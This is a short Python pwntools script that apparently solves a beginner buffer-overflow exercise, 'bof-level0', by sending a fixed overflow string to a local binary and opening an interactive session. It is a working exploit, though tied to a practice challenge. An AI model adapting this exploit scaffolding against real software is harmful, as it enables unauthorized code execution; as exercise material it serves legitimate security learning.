#!/usr/bin/env python

from pwn import *

p = process("./bof-level0")

p.recv()

p.send("20201c1c181814141010ABCDEFGHIJKL" + "\n")

p.interactive()
